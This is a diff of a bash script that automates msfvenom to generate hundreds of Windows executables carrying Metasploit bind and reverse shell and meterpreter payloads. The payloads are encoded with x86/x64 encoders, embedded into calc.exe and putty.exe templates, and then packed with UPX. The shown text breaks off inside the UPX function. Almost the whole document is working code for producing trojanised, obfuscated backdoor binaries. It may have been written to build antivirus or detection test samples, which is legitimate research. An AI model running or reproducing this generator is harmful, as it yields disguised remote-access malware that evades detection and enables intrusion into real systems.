@@ -2,6 +2,7 @@
 # 0.1 - first working version
 # 0.2 - change variables with many elements to arrays
 # 0.3 - remove genereting separeted file to run scripts
+# 0.4 - refactoring code with functions
 
 BASE_BIND_OPT=("meterpreter/bind_nonx_tcp" "meterpreter/bind_tcp" "patchupmeterpreter/bind_nonx_tcp" "patchupmeterpreter/bind_tcp" "shell/bind_tcp" "shell/bind_nonx_tcp" "shell_bind_tcp" "shell_bind_tcp_xpfw" "shell_hidden_bind_tcp" "x64/meterpreter/bind_tcp" "x64/shell/bind_tcp" "x64/shell_bind_tcp")
 IPV6_BIND_OPT=("meterpreter/bind_ipv6_tcp" "patchupmeterpreter/bind_ipv6_tcp" "shell/bind_ipv6_tcp")
@@ -36,15 +37,462 @@ TEMPLATE_PUTTY_X64="msfvenom -p - -a x64 --platform windows -x ./putty_x64.exe"
 TEMPLATE_PUTTY_X64_C="msfvenom -p - -a x64 --platform windows -x ./putty_x64.exe -k"
 
 BIN=("calc_x86.exe" "calc_x64.exe" "putty_x86.exe" "putty_x64.exe")
-EXITFUNCIONS=("seh" "thread" "process")
-
+EXITFUNCTIONS=("seh" "thread" "process")
 MODS_COUNT=21	# all encodings and templates and the simplest form without enc and template (grep msfvenom gen_samples.sh | wc -l)
-SH_COUNT=$(( ${#BASE_BIND_OPT[@]} + ${#IPV6_BIND_OPT[@]} + ${#RC4_BIND_OPT[@]} + ${#BASE_REV_OPT[@]} + ${#IPV6_REV_OPT[@]} + ${#RC4_REV_OPT[@]} + ${#HOP_REV_OPT[@]} + ${#ALLPORTS_REV_OPT[@]} + ${#DNS_REV_OPT[@]} + ${#DNS_RC4_REV_OPT[@]} + ${#HTTPS_PROXY_REV_OPT[@]} ))
-ITERATIONS=$(( ${#EXITFUNCIONS[@]} * ${MODS_COUNT} * ${SH_COUNT} ))
 
-SHELLCODES=("${BASE_BIND_OPT[@]} ${IPV6_BIND_OPT[@]} ${RC4_BIND_OPT[@]} ${BASE_REV_OPT[@]} ${IPV6_REV_OPT[@]} ${RC4_REV_OPT[@]} ${HOP_REV_OPT[@]} ${ALLPORTS_REV_OPT[@]} ${DNS_REV_OPT[@]} ${DNS_RC4_REV_OPT[@]} ${HTTPS_PROXY_REV_OPT}")           # we lost '"' here!'
-I=1
-TIME=0
+function gen_samples {
+	SH_COUNT=$(( ${#BASE_BIND_OPT[@]} + ${#IPV6_BIND_OPT[@]} + ${#RC4_BIND_OPT[@]} + ${#BASE_REV_OPT[@]} + ${#IPV6_REV_OPT[@]} + ${#RC4_REV_OPT[@]} + ${#HOP_REV_OPT[@]} + ${#ALLPORTS_REV_OPT[@]} + ${#DNS_REV_OPT[@]} + ${#DNS_RC4_REV_OPT[@]} + ${#HTTPS_PROXY_REV_OPT[@]} ))
+	ITERATIONS=$(( ${#EXITFUNCTIONS[@]} * ${MODS_COUNT} * ${SH_COUNT} ))
+
+	SHELLCODES=(${BASE_BIND_OPT[@]} ${IPV6_BIND_OPT[@]} ${RC4_BIND_OPT[@]} ${BASE_REV_OPT[@]} ${IPV6_REV_OPT[@]} ${RC4_REV_OPT[@]} ${HOP_REV_OPT[@]} ${ALLPORTS_REV_OPT[@]} ${DNS_REV_OPT[@]} ${DNS_RC4_REV_OPT[@]} ${HTTPS_PROXY_REV_OPT})           # we lost '"' here!'
+	I=1
+	TIME=0
+
+	date > msfvenom.log
+	echo "=============================" >> msfvenom.log
+
+	for EXITFUNC in "${EXITFUNCTIONS[@]}"; do
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo -e "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_calc.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_CALC_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_calc_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_CALC_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_putty.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_PUTTY_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_putty_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_PUTTY_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_calc.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_CALC_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_calc_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_CALC_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_putty.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_PUTTY_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_putty_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_PUTTY_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_calc.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_CALC_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_calc_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_CALC_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_putty.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_PUTTY_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_putty_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_PUTTY_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_calc.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_CALC_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_calc_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_CALC_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_putty.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_PUTTY_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+		for SHELLCODE in "${SHELLCODES[@]}"; do
+			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_putty_c.exe
+			echo "=====================================" >> msfvenom.log
+			echo $NAME >> msfvenom.log
+			echo "=====================================" >> msfvenom.log
+			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+			tput clear
+			tput cup 0 0
+			echo "msfvenom"
+			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_PUTTY_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
+			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+			TIME=$(( $TIME + $DELTA ))
+			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+			I=$((I+1))
+		done
+
+	done
+}
+
+function gen_upx {
+	I=1
+	TIME=0
+	ITERATIONS=$(( `ls samples | wc -l` * 4 ))
+
+	date > upx.log
+	echo "=============================" >> upx.log
+
+	for i in `ls samples`; do 
+		NAME=`echo $i | sed 's/.exe//'`; 
+
+		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+		tput clear
+		tput cup 0 0
+		echo "UPX: fast"
+		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
